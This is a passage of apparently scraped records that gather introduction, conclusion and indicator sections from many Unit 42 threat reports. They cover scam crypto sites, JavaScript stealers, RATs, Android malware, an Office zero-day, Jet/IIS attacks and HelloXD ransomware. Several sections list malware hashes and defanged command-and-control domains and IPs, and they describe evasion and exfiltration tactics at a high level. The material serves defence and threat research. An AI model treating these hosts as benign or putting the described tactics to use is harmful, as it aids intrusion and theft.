is likely that they are not designed to be ephemeral like containers or serverless functions.\nFrom a defensive point of view, this makes both containers and serverless convenient for continuous security. Breached containers or functions can be easily detected and disposed of, while new patched code could rapidly be pushed to retain functionality.\nPalo Alto Networks customers using Prisma Cloud can successfullydetect and mitigate vulnerabilitiesand rely on Prisma Cloud Compute'sextensive auditsandruntime defensefeatures to catch adversaries attempting to obtain persistence on their machines.", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 researchers discovered a campaign distributing thousands of fraudulent cryptocurrency investment platforms \u200b\u200bvia websites and mobile applications. This article describes how threat actors systematically create, promote and potentially profit from these scams, highlighting the techniques used to deceive victims and the potential scale of the operation.\nThe campaign impersonates well-known brands, cryptocurrency platforms and popular organizations to lure victims. The consistent design of the websites and mobile apps suggests the use of a standardized toolkit for developing these platforms at scale.\nThere are several additional indicators attributing these activities to a single threat actor. This is underscored by the consistent registration of domains primarily in Singapore, predominantly using registrars with lenient policies and repeated patterns of fake registrant names. These domains also employ free HTTPS certificates and domain fronting via a popular public cloud service to obscure their true locations.\nThis campaign primarily targets users in East African and Asian countries, with scammers hosting large Telegram channels and groups to engage with victims. The scammers lure users with promises of unrealistically high investment returns and operate similar to Ponzi schemes by encouraging users to recruit others through multi-level affiliate programs.\nPalo Alto Networks customers are better protected from the threats discussed in this article through ourNext-Generation Firewall'sAdvanced WildFire,Advanced URL FilteringandAdvanced DNS Securitysubscriptions.", "source": "Palo"}, {"title": "Conclusion", "content": "This article detailed a widespread scam cryptocurrency investment campaign, which operates similarly to Ponzi schemes. They impersonate popular and reputable brands, organizations and events to lure victims. In 2024, we uncovered thousands of websites associated with this campaign.\nWe found strong evidence that suggests a single threat actor likely operates these websites, given the consistent registration patterns and the use of similar infrastructure. This actor may also be using a sophisticated toolkit to create these fraudulent sites at scale since both the websites and mobile apps involved share common design elements and functionalities.\nWe hope that the details of the scam crypto investment campaign described in our article can help readers identify similar fraudulent schemes. We strongly advise readers to always conduct thorough research before investing, to safeguard against such scams. Be particularly cautious of unrealistic promises of guaranteed returns, as these are often major red flags for scam investment schemes.\nPalo Alto Networks customers are better protected from the threats discussed in this article through ourNext-Generation Firewall'sAdvanced WildFire,Advanced URL FilteringandAdvanced DNS Securitysubscriptions.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America: Toll Free: +1 (866) 486-4842 (866.4.UNIT42) \nUK: +44.20.3743.3660 \nEurope and Middle East: +31.20.299.3130 \nAsia: +65.6983.8730 \nJapan: +81.50.1790.0200 \nAustralia: +61.2.4062.7950 \nIndia: 00080005045107\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 researchers have observed threat actors using malicious JavaScript samples to steal sensitive information by abusing popular survey sites, low-quality hosting and web chat APIs. In some campaigns, attackers created chatbots that they registered to someone noteworthy such as an Australian footballer. Other malware campaigns we saw included both web skimmers injected into compromised sites and traditional phishing sites.\nIn this article, we'll describe some of the tactics used by malicious JavaScript to steal information through several case studies. The case studies show specific examples of how the malware we observed tries to evade traditional static and dynamic analysis by using obfuscation, unusual Document Object Model (DOM) interactions and selective payload detonation.\nWe have identified campaigns that collect passwords and credit card information by using our JavaScript malware sandbox. Palo Alto Networks customers receive protection from the threats discussed through severalPalo Alto Networks Next-Generation Firewallcloud-delivered security services, includingAdvanced WildFireandAdvanced URL Filtering(AUF). Also,Cortex XDR analyticsprovides coverage for such threats with network detection and response (NDR) and EDR analytics detectors for instant messaging, exfiltration and C2 techniques.", "source": "Palo"}, {"title": "Conclusion", "content": "We're continuing to see JavaScript information stealers use a variety of techniques to evade detection. In addition to using various obfuscation techniques, they increasingly use ways to evade dynamic analysis by selectively detonating their payload and also use custom loaders to further complicate the detection process.\nThe end goal of these stealers is to exfiltrate sensitive information from the victims. We identified evasive techniques that are becoming increasingly popular to exfiltrate sensitive information such as the following:\nUsing popular survey sites \nLow quality hosting \nWeb chat APIs\nWe recommend that security practitioners continuously monitor exfiltration endpoints to identify such malicious use cases. Furthermore, we believe service providers of such services can take measures to proactively weed out malicious parties abusing their platforms.\nPalo Alto Networks customers receive protection from the threats discussed above through ourAdvanced URL Filteringcloud-delivered security service, which automatically analyzes offline and online information stealing attacks. Also,Cortex XDR analyticsprovides coverage for such threats with NDR and EDR analytics detectors for instant messaging, exfiltration and C2 techniques using local and global analytics profiles.\nTheAdvanced WildFiremachine-learning models and analysis techniques have been reviewed and updated in light of the IoCs shared in this research.\nWe recommend that website operators continue to keep their software up to date, as this is a common vector for attackers to compromise websites to host malicious JavaScript.", "source": "Palo"}, {"title": "Indicators", "content": "The malware evasion techniques described in this article are general malware behaviors and not limited to the specific campaigns here. However, here is a list of the samples referenced in this article:\nbf3ab10a5d37fee855a9336669839ce6ad3862ad32f97207d4e959faaba0a3ed \n13429eebb74575523b242e16b51eacf287a351c6de04557ec3cc343812aae0cb \ndb346adb1417340e159c45c5e4fdaea039c0edbca6e62ad46aa9aec1cf1273a1 \nda416dd6d35e2b779d164f06d4798ca2d9a3d3867e7708b11bf6a863a5e7ffc2 \nf82ef9a948b4eaf9b7d8cda13c5fa8170c20b72fde564f7d3a0f271644c73b92 \nacf325dad908534bd97f6df0926f30fc7938a1ac6af1cec00aa45bcf63699e24", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 recently observed activity involving the Remote Access Trojan KHRAT used by threat actors to target the citizens of Cambodia.\nSo called because the Command and Control (C2) infrastructure from previous variants of the malware was located in Cambodia, as discussed by Roland Dela Paz at Forcepointhere, KHRAT is a Trojan that registers victims using their infected machine's username, system language and local IP address. KHRAT provides the threat actors typical RAT features and access to the victim system, including keylogging, screenshot capabilities, remote shell access and so on.\nThis report covering contemporary variants of KHRAT, discusses updated techniques and a recent attack affecting Cambodians, including:\nUpdated spear phishing techniques and themes; \nMultiple techniques to download and execute additional payloads using built-in Windows applications; \nExpanded infrastructure mimicking the name of the well-known cloud-based file hosting service, Dropbox; \nCompromised Cambodian government servers.\nIn its various forms, including document files, executables and dynamic link libraries, KHRAT is not very prevalent with just over fifty network sessions seen across our sensors since the start of the year, with a slight uptickvisible in the last couple of months.", "source": "Palo"}, {"title": "Conclusion", "content": "The threat actors behind KHRAT have evolved the malware and their TTPs over the course of this year, in an attempt to produce more successful attacks, which in this case included targets within Cambodia.\nThis most recent campaign highlights social engineering techniques being used with reference and great detail given to nationwide activities, likely to be forefront of peoples' minds; as well as the new use of multiple techniques in Windows to download and execute malicious payloads using built-in applications to remain inconspicuous which is a change since earlier variants.\nOther notable actions by the threat actors included updated infrastructure purporting to be part of either the well-known cloud-based company, Dropbox, or a travel agency, likely to appear genuine, masquerading traffic under the premise of other applications to communicate with the attack infrastructure, some of which included compromised Cambodian Government servers. The attackers use of the click-tracking software on their C2 domain lets them track both intended victims and researchers who have discovered the activity, which is not something we have found to date in use by many groups.\nWe believe this malware, the infrastructure being used, and the TTPs highlight a more sophisticated threat actor group, which we will continue to monitor closely and report on as necessary.\nPalo Alto Networks customers are protected and may learn more via the following:\nSamples are classified as malicious by WildFire and Traps prevents their execution. \nDomains and IPs have been classified as malicious and IPS signatures generated. \nAutoFocus users may learn more via theKHRATtag.", "source": "Palo"}, {"title": "Indicators", "content": "KHRAT Delivery Document:\nc51fab0fc5bfdee1d4e34efcc1eaf4c7898f65176fd31fd8479c916fa0bcc7cc\nKHRAT Dropper:\n53e27fd13f26462a58fa5587ecd244cab4da23aa80cf0ed6eb5ee9f9de2688c1\nKHRAT Payload:\nc0baa57cbb66b8a86aac7d4eeab7a0dc1ecfb528d8e92a45bdb987d1cd5cb9b2\nKHRAT DLL:\nde4ab35a2de67832298f5eb99a9b626a69d1beca78aaffb1ce62ff54b45c096a\nRelated infrastructure\nupload-dropbox[.]com\nupdate.upload-dropbox[.]com\ndoc.upload-dropbox[.]com\ndate.upload-dropbox[.]com\nftp.upload-dropbox[.]com\ninter-ctrip[.]com\nkh.inter-ctrip[.]com\nbit.inter-ctrip[.]com\ncookie.inter-ctrip[.]com\nhelp.inter-ctrip[.]com\ndcc.inter-ctrip[.]com\ntravehappy.inter-ctrip[.]com\nonline.inter-ctrip[.]com\nupgrade.inter-ctrip[.]com\nvip53[.]cn\ndns.vip53[.]cn\nftp.vip53[.]cn\nmail.vip53[.]cn\nnc.vip53[.]cn\nnz.vip53[.]cn\nsl.vip53[.]cn\nsz.vip53[.]cn\nyk.vip53[.]cn", "source": "Palo"}, {"title": "Introduction", "content": "This article discusses recent samples of BadPack Android malware and examines how this threat's tampered headers can obstruct malware analysis. We also review the effectiveness of various freely available tools for analyzing BadPack Android Package Kit (APK) files.\nThe cybersecurity landscape has seen a dramatic increase in malicious Android applications in recent years. One major contributor to this trend is APK samples bundled as BadPack files.\nBadPack is an APK file intentionally packaged in a malicious way. In most cases, this means an attacker has maliciously altered header information used in the compressed file format for APK files.\nThese tampered headers are a key feature of BadPack, and such samples typically pose a challenge for Android reverse engineering tools. Many Android-based banking Trojans likeBianLian,CerberusandTeaBotuse BadPack.\nPalo Alto Networks customers receive better protection from these BadPack APK samples through ourNext-Generation FirewallwithCloud-Delivered Security Services, includingAdvanced WildFire,Advanced DNS SecurityandAdvanced URL Filtering.\nPalo Alto Networks reported these findings to Google. Based on Google's current detection, no apps containing this malware are found on Google Play. Android users are automatically protected against known versions of this malware byGoogle Play Protect, which is on by default on Android devices with Google Play Services. Google Play Protect can warn users or block apps known to exhibit malicious behavior, even when those apps come from sources outside of Play.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Background", "content": "APK files are applications used by the Android operating system (OS). APK applications are packages that use the ZIP archive format. These packages contain a file namedAndroidManifest.xml. This is theAndroid Manifestthat stores data and instructions for the archive's content.\nAndroidManifest.xmlcontains valuable information about an APK-based application, especially for APK malware samples. In a BadPack APK file, attackers have tampered with its ZIP header data, attempting to prevent analysis of its content.\nAnalysis tools likeApktoolandJadxoften struggle with extracting content from BadPack APK files. For example, we found Apktool failed to extractAndroidManifest.xmlfrom one of the BadPack APK samples we review later in this article.\nWe reviewed our Advanced WildFire detection telemetry from June 2023 through June 2024 for BadPack APK files, and we discovered almost 9,200 matching samples. The graph in Figure 1 lists detections by month, illustrating BadPack trends during this time frame.\nThe number of samples we found through Advanced WildFire indicates that BadPack APK malware is a notable threat. To combat this threat, we must better understand BadPack.\nBadPack prevents normal extraction techniques, and since the most critical component of an APK archive is its Android Manifest, we should first understand the roleAndroidManifest.xmlin an APK archive.", "source": "Palo"}, {"title": "Conclusion", "content": "The increasing number of Android devices present a growing target that poses a significant challenge in combating malware attacks on the platform. APK files using BadPack reflect the increasing sophistication of APK malware samples. This not only presents a formidable challenge for security analysts, but it also underscores the need for continuous development of innovative techniques and tools to identify and mitigate these threats.\nPeople should be suspicious of Android applications requiring unusual permissions not aligned with their advertised functionality, like an Android flashlight app requesting permissions to access the device's phonebook. We recommend that people also refrain from installing applications that originate from third-party sources onto their devices.\nPalo Alto Networks customers receive protection from BadPack APK samples throughNext-Generation Firewallwith ourCloud-Delivered Security Services, includingAdvanced WildFire,Advanced DNS SecurityandAdvanced URL Filtering.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks reported these findings to Google. Based on Google's current detection, no apps containing this malware are found on Google Play. Android users are automatically protected against known versions of this malware byGoogle Play Protect, which is on by default on Android devices with Google Play Services. Google Play Protect can warn users or block apps known to exhibit malicious behavior, even when those apps come from sources outside of Play.\nPalo Alto Networks has shared our findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Indicators", "content": "SHA256 hashes of BadPack malware samples:\n0003445778b525bcb9d86b1651af6760da7a8f54a1d001c355a5d3ad915c94cb \n015bd2e799049f5e474b80cbbdcd592ce4e2dfbfae183bada86a9b6ec103e25e \n131135a7c911bd45db8801ca336fc051246280c90ae5dafc33e68499d8514761 \n90c41e52f5ac57b8bd056313063acadc753d44fb97c45c2dc58d4972fe9f9f21", "source": "Palo"}, {"title": "Introduction", "content": "In December 2016I posted the first part of this seriesof blogs introducing the EMEA regional threat reports that I have been authoring and publishing internally for the last 6 months of 2016. I also introduced the EMEA region at a high level\u2013 abundant in countries each with mixed languages, cultures and cyber security maturity levels, with different industry sectors and with different economic profiles. A very diverse environment with rich pickings for cyberattacks.\nIn that post, I also established the structure for these posts: An overview of specific overall trends for the region, a focus on two sets of three countries (in the first report these were the United Kingdom, Germany and France and Turkey, Saudi Arabia and United Arab Emirates), a conclusion and cyber hygiene recommendations.\nContinuing on from the first blog I will discuss here the threat landscape from late last year and into 2017 for another two sets of countries:\nThe Netherlands, Sweden, Denmark, and Belgium \nItaly, Spain, and Switzerland", "source": "Palo"}, {"title": "Conclusion", "content": "EMEA is a socially and economically diverse region with many interesting assets whether they be citizen data, financial information, or natural resources and, as such, is a target for cyber criminals the world over.\nIt's probably no surprise to see ransomware as a prevalent malware crossing all borders into all countries as this malware is really victim-agnostic. Any data on any computer in any country is a viable target.\nClearly information-stealing malware, such as KINS and Pony, are prevalent in countries that have a more service-based economy that manage and process plenty of user data and personally identifiable information (PII). While other countries more reliant on industrial sectors and natural resources seem to have more cyberattacks that make use of RATs providing full control to remote attackers and use of key-logging technologies to harvest data.", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 has been tracking a new Remote Access Trojan (RAT) being sold for $40 USD since April 2016, known as \"Orcus\". Though Orcus has all the typical features of RAT malware, it allows users to build custom plugins and also has a modular architecture for better management and scalability. The objective of this blog is to highlight some of the capabilities of this new RAT family and the impact seen so far.", "source": "Palo"}, {"title": "Background", "content": "Before we discuss the details of this RAT family, let's discuss how Orcus became a commercially sold RAT. Around October 2015, the developer of Orcus, going with the alias of \"Sorzus\", posted a thread on a hacker forum about a RAT he was developing, soliciting feedback on how it could be published. The developer had then named the tool as \"Schnorchel\", German for \"Snorkel\".\nFigure 1 Sorzus discusses publishing Orcus\nThe figure below shows the early versions of Orcus when it was being developed. It is interesting to see that the developer details mentioned on the earlier version indicates \"Vincent (Alkalinee)\", and we are also aware that 'Alkalinee' was the alias which was being used by the developer before taking the new alias of 'Sorzus'. (This also suggests that the real name of the Orcus developer may be 'Vincent'.)\nFigure 2 Early version of Orcus which was known as \"Schnorchel\"\nThe developer had shared intentions to publish the RAT for free and make it open-source. However, some of the users in the forum responded, advising to make it commercial instead of sharing it for free or making it open source, citing that the source code would eventually be used by others to repackage and sell it as a new RAT. One forum user, alias \"Armada\", offered to assist \"Sorzus\" on helping out with publishing the tool and apparently became Sorzus' eventual partner.\n\"Sorzus\" and \"Armada\" are believed to be the two main individuals currently managing the sales and development of Orcus. Brian Krebs published abloga few weeks ago disclosing details of the individual who has been supposedly known to be the person behind Orcus. Our analysis suggests that 'Sorzus' is the main developer of the RAT and 'Armada' is mostly responsible for sales and support of the tool.", "source": "Palo"}, {"title": "Conclusion", "content": "The individuals behind Orcus are selling the RAT by advertising it as a \"Remote Administration Tool\" under a supposedly registered business and claiming that this tool is only designed for legitimate business use. However, looking at the feature capabilities, architecture of the tool, and the publishing and selling of the tool in hacker forums, it is clear that Orcus is a malicious tool, and that its target customer is cyber criminals. It's not uncommon but this is an interesting case where a developer with an initial intention to release the code for free or open source, ends up in collaborating with an individual in a hacker forum who has prior experience in building and selling similar malicious tools, and creates a commercial RAT which has started to gain wide acceptance among cyber criminals with its unique feature set and flexible architecture.\nPalo Alto Networks WildFire correctly identifies Orcus as malicious and AutoFocus customers can track this threat using theOrcustag.", "source": "Palo"}, {"title": "Introduction", "content": "The \"Tick\" group has conducted cyber espionage attacks against organizations in the Republic of Korea and Japan for several years. The group focuses on companies that have intellectual property or sensitive information like those in the Defense and High-Tech industries. The group is known to use custom malware called Daserf, but also employs multiple commodity and custom tools, exploit vulnerabilities, and use social engineering techniques.\nRegarding the command and control (C2) infrastructure, Tick previously used domains registered through privacy protection services to keep their anonymity, but have moved to compromised websites in recent attacks. With multiple tools and anonymous infrastructure, they are running longstanding and persistent attack campaigns. We have observed that the adversary has repeatedly attacked a high-profile target in Japan using multiple malware families for the last three years.", "source": "Palo"}, {"title": "Conclusion", "content": "Tick was spotted last year, but they are actively and silently attacking various organizations in South Korea and Japan for a number of years. While some of the group's tools, tactics, and procedures (TTPs) have been covered within this article, it is likely there is much that still remains uncovered.\nPalo Alto Networks customers are protected by these threats in the following ways:\nAll samples discussed are classified as malicious by the WildFire sandbox platform. \nAll identified domains have been classified as malicious. \nAutoFocus users can track the malware described in this report using Tick campaign tag and various malware tags. \nCustomers running Traps are protected from the discussed threats.", "source": "Palo"}, {"title": "Introduction", "content": "With July's Patch Tuesday release, Microsoft disclosed a zero-day Office and Windows HTML Remote Code Execution Vulnerability, CVE-2023-36884, which it rated \"important\" severity. Microsoft has observed active in-the-wild exploitation of this vulnerability using specially crafted Microsoft Office documents. It should be noted that exploitation requires the user to open the malicious document.\nUnit 42 Threat Intelligence can confirm that this vulnerability has been utilized since at least July 3, 2023. Further analysis is being conducted; an update will be made to this Threat Brief as the analysis is completed.\nMicrosoft has released apatch for Microsoft Officethat stops the attack chain leading to execution of this vulnerability. For those unable to patch, they recommend blocking Office applications from creating child processes or settingFEATURE_BLOCK_CROSS_PROTOCOL_FILE_NAVIGATIONregistry key to avoid exploitation. See theSecurity Updatespage for more information.\nPalo Alto Networks customers receive protections from and mitigations for CVE-2023-36884 in the following ways:\nOrganizations can engage theUnit 42 Incident Responseteam for specific assistance with this threat and others. \nCortex XDR and XSIAM agents help protect against post-exploitation activities associated with exploitation of CVE-2023-36884 as well as use Local Analysis detections for RomCom binaries on Windows environments. \nCortex XDR blocks the publicly known exploit chain for CVE-2023-36884. \nAdvanced WildFire can help detect and prevent attacks involving highly evasive malware. \nNext-Generation Firewall with Advanced Threat Prevention security subscriptions can help block associated payloads and attack. \nCloud-Delivered Security Services can categorize C2 domains associated with this activity as malicious.\nUnit 42 will continue to monitor the situation for updated information, release of proof-of-concept code and evidence of more widespread exploitation. This brief will be updated as more information on the vulnerability and mitigations becomes available.", "source": "Palo"}, {"title": "Conclusion", "content": "Based on the amount of publicly available information and current research and analysis, Palo Alto Networks highly recommends applying thepatch for Microsoft Officeto protect your organization. Palo Alto Networks and Unit 42 will continue to monitor the situation for updated information, release of proof-of-concept code and evidence of more widespread exploitation.\nPalo Alto Networks customers are protected by our products and services, as listed below. We will update this threat brief as more relevant information becomes available.\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Indicators", "content": "a61b2eafcf39715031357df6b01e85e0d1ea2e8ee1dfec241b114e18f7a1163f \ne7cfeb023c3160a7366f209a16a6f6ea5a0bc9a3ddc16c6cba758114dfe6b539 \n3a3138c5add59d2172ad33bc6761f2f82ba344f3d03a2269c623f22c1a35df97 \n48142dc7fe28a5d8a849fff11cb8206912e8382314a2f05e72abad0978b27e90 \n07377209fe68a98e9bca310d9749daa4eb79558e9fc419cf0b02a9e37679038d \n5f40cb4852ec50ee24f3cd951a172c725d02012d17dd645b6ce22d324aa140ad \n1a7bb878c826fe0ca9a0677ed072ee9a57a228a09ee02b3c5bd00f54f354930f \n0501d09a219131657c54dba71faf2b9d793e466f2c7fdf6b0b3c50ec5b866b2a \n74.50.94[.]156 \n94.232.40[.]34 \n66.23.226[.]102 \n104.234.239[.]26 \n65.21.27[.]250 \nfinformservice[.]com \naltimata[.]org \npenofach[.]com \nbentaxworld[.]com \nwexonlake[.]com \nukrainianworldcongress[.]info\nUpdated July 13, 2023, at 3:00 p.m. PT to add Advanced Wildfire protections information.\nUpdated July 13, 2023, at 8:45 p.m. PT to note status of patch and detection guidance.\nUpdated July 14, 2023, at 11:58 a.m. PT to add protections information for Next-Generation Firewall and Cloud-Delivered Security Services. Cortex XDR and XSIAM protections information was updated. Details, attack scope, interim guidance, and threat hunting queries were added. IoCs are now listed.\nUpdated July 17, 2023, at 4:15 p.m. PT to add Cortex XSOAR information.\nUpdated August 9, 2023, at 10:35 a.m. PT to include patch released by Microsoft.\nUpdated August 10, 2023, at 10:25 a.m. PT to include additional Cortex XDR protections.", "source": "Palo"}, {"title": "Introduction", "content": "Newly registered domains (NRDs) are known to be favored by threat actors to launch malicious campaigns.Academicandindustryresearch reports have shown statistical proof that NRDs are risky, revealing malicious usage of NRDs including phishing, malware, and scam. Therefore, best security practice calls for blocking and/or closely monitoring NRDs in enterprise traffic. Despite the evidence, there hasn't yet been a comprehensive case study on the malicious usages and threats associated with NRDs using real world examples. This blog presents that comprehensive case study and analysis of malicious abuses of NRDs by bad actors.\nWe have been tracking NRDs for more than nine years. We collaborate with the Internet Corporation for Assigned Names and Numbers (ICANN) and various domain registries and registrars, which provides us direct visibility of many NRDs registered under both generic top-level domains (gTLDs) and country-code top-level domains (ccTLDs). We also indirectly identify NRDs by leveraging a combination of data sources, including WHOIS, zone files, and passive DNS. Our proprietary NRD feed consists of 1,530 top-level domains, which to our knowledge exceeds the best NRD feed/service publicly offered on the market.\nOur analysis shows that more than 70% of NRDs are \"malicious\" or \"suspicious\" or \"not safe for work.\" This ratio is almost 10 times higher than the ratio observed in Alexa's top 10,000 domains. Also, most NRDs used for malicious purposes are very short-lived. They can be alive only for a few hours or a couple of days, sometimes even before any security vendor can detect it. This is why blocking NRDs is a necessary, preventive security measure for enterprises.\nIn this blog, we present some high-level statistics on recent NRDs, demonstrate the malicious usage and threats associated with them through case studies and conclude with a discussion of best practices.", "source": "Palo"}, {"title": "Conclusion", "content": "In sum, newly registered domains (NRDs) are often times abused by bad actors for nefarious purposes, including but not limited to C2, malware distribution, phishing, typosquatting, PUP/Adware, and spam. At the same time, there are benign uses as well, such as launching a new product, creating a new brand or campaign, hosting a new conference, or building a new personal site.\nAt Palo Alto Networks, we recommend blocking access to NRDs with URL Filtering. While this may be deemed a bit aggressive by some due to potential false-positives, the risk from threats via NRDs is much greater. At the bare minimum, if access to NRDs are allowed, then alerts should be set up for additional visibility. We define NRDs as any domain that has been registered or had a change in ownership within the last 32 days. Our own analysis has indicated that the first 32 days is the optimal time frame when NRDs are detected as malicious.\nAs seen in the TLD section of this blog, we would even go as far as to recommend blocking complete TLDs (Figure 4) that are mainly utilized by bad actors. Of course, each organization must understand what their tolerance is for potential false-positives when blocking whole TLDs.\nPalo Alto Networks customers are all protected against malicious indicators (domain, IP, URL, SHA256) mentioned in this blog, via URL Filtering, DNS Security, WildFire, and Threat Prevention where applicable. AutoFocus customers with further interests in the malware mentioned in this blog can refer to AutoFocus tagsAzoRult,Emotet,Pykspa, andRamnit.", "source": "Palo"}, {"title": "Introduction", "content": "In early 2012, a developer started selling the first of the Adwind family, Java-based remote access tools (RATs), called \"Frutas.\" In the ensuing years, it has been rebranded at least seven times. Its other names have included Adwind, UnReCoM, Alien Spy, JSocket, JBifrost, UnknownRat, and JConnectPro.\nThe Adwind RAT family remains prevalent in the wild. Palo Alto Networks has collected over 45,000 samples from the various Adwind iterations. We have observed these samples used in over 2 million attacks against Palo Alto Networks customers since 2017, highlighting the high impact of this popular commodity RAT.\nThe first six iterations of the multi-platform Adwind RAT family have beenexhaustively documented, so we will not rehash analysis of the RAT itself. This piece describes two hitherto undocumented recent rebrandings: \"Unknown RAT\" and \"jConnect Pro RAT and clarifies some misconceptions. We have identified the author of this commodity malware, demonstrating that ownership of this RAT under its various monikers never actually changed.\nThis blog post documents Adwind RAT family's beginning as an alleged science project, evolution to become widely available commodity malware, and eventual refinement into a private sale to what appears to be a closed customer base. By developing a technique to isolate cracked versions from licensed samples, we have documented the impact of the availability of free, cracked versions, and identified researcher reporting as a repeated catalyst to recent rebranding.", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 recently shared information about a new attack surface targeting Microsoft Internet Information Services (IIS) and SQL Server at Black Hat Asia 2021.In our presentation, we introduced a previously undisclosed technique to execute SQL queries on the remote database in IIS and SQL Server under SQL injection or ad hoc scenarios. We also discussed three typical cases picked from around 100 Jet vulnerabilities that we discovered in a three-month period. Here, we cover the details of the technique, which allows threat actors to remotely attack IIS and SQL Server to gain SYSTEM privilege by using Microsoft Jet Database Engine vulnerabilities.\nIn response to this research, Microsoft released a complex patch to mitigate this attack surface. However, the patch is turned off by default and most Jet vulnerabilities are still not patched. We highly recommend that our customers proactively turn on mitigation to disable remote tables access in the registry and stay cautious of these kinds of attacks. Besides that, the mitigation for the attack surface in Access Connectivity Engine (ACE) still remains imperfect, and we are working with Microsoft to release a complete patch for both MS Jet and ACE.\nPalo Alto NetworksNext-Generation Firewallcustomers can help mitigate such attacks by using App-ID and theThreat Preventionsecurity subscription.", "source": "Palo"}, {"title": "Conclusion", "content": "IIS and SQL Server are examples of fundamental components in the Microsoft ecosystem that have been widely deployed in many production systems and services. Microsoft Jet Database Engine, including MS Jet and ACE, are over 20 years old, and a vast majority of the Jet modules have been found to be easily exploitable due to limited exploit mitigations. The remote database access feature connects the Jet vulnerabilities with IIS and SQL Server components, thereby downgrading their security to the same level as the Jet Database Engine. Attackers could potentially leverage this feature to attack IIS and SQL Server and get SYSTEM privilege remotely from a single SQL injection.\nPalo Alto Networks recommends all of our customers follow the Microsoft guidance and disable remote database access to mitigate this severe attack surface. This can help prevent attackers from using Jet vulnerabilities to compromise IIS and SQL Server. Palo Alto Networks Next-Generation Firewalls can help mitigate such attacks by using App-ID and the Threat Prevention security subscription.", "source": "Palo"}, {"title": "Introduction", "content": "HelloXD is a ransomware family performing double extortion attacks that surfaced in November 2021. During our research we observed multiple variants impacting Windows and Linux systems. Unlike other ransomware groups, this ransomware family doesn't have an active leak site; instead it prefers to direct the impacted victim to negotiations through TOX chat and onion-based messenger instances.\nUnit 42 performed an in-depth analysis of the ransomware samples, the obfuscation and execution from this ransomware family, which contains very similar core functionality to the leaked Babuk/Babyk source code. It was also observed that one of the samples deployed MicroBackdoor, an open-source backdoor allowing an attacker to browse the file system, upload and download files, execute commands, and remove itself from the system. We believe this was likely done to monitor the progress of the ransomware and maintain an additional foothold in compromised systems.\nDuring the analysis of the MicroBackdoor sample, Unit 42 observed the configuration and found an embedded IP address, belonging to a threat actor we believe is potentially the developer:x4k, also known asL4ckyguy, unKn0wn, unk0w, _unkn0wnandx4kme.\nUnit 42 has observedx4kin various hacking and non-hacking forums, which has linked the threat actor to additional malicious activity such as:\nCobalt Strike Beacon deployment. \nSelling proof-of-concept (PoC) exploits. \nCrypter services. \nDeveloping custom Kali Linux distros. \nHosting and distributing malware. \nDeployment of malicious infrastructure.\nPalo Alto Networks detects and prevents HelloXD and adjacentx4kactivity with the following products and services:Cortex XDRandNext-Generation Firewalls(including cloud-delivered security subscriptions such asWildFire).\nDue to the surge of this malicious activity, we've created this threat assessment for overall awareness.", "source": "Palo"}, {"title": "Conclusion", "content": "Unit 42 research encountered HelloXD, a ransomware family in its initial stages \u2013 but already intending to impact organizations. While the ransomware functionality is nothing new, during our research, following the lines, we found out the ransomware is most likely developed by a threat actor namedx4k. This threat actor is well known on various hacking forums, and seems to be of Russian origin. Unit 42 was able to uncover additionalx4kactivity being linked to malicious infrastructure, and additional malware besides the initial ransomware sample, going back to 2020.\nRansomware is a lucrative operation if done correctly. Unit 42 has observed ransom demands andaverage paymentsgoing up in the latestRansomware Threat Report. Unit 42 believes thatx4k, this threat actor, is now expanding into the ransomware business to capitalize on some of the gains other ransomware groups are making.\nPalo Alto Networks detects and prevents HelloXD andx4kactivity in the following ways:\nWildFire: All known samples are identified as malware. \nCortex XDRwith:Indicators for HelloXD.Anti-Ransomware Module to detect HelloXD encryption behaviors on Windows.Local Analysis detection for HelloXD binaries on Windows.Behavioral Threat Protection rule prevents Ransomware activity on Linux. \nIndicators for HelloXD. \nAnti-Ransomware Module to detect HelloXD encryption behaviors on Windows. \nLocal Analysis detection for HelloXD binaries on Windows. \nBehavioral Threat Protection rule prevents Ransomware activity on Linux. \nNext-Generation Firewalls: DNS Signatures detect the known C2 domains, which are also categorized as malware in the Advanced URL Filtering database.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.\nIndicators of 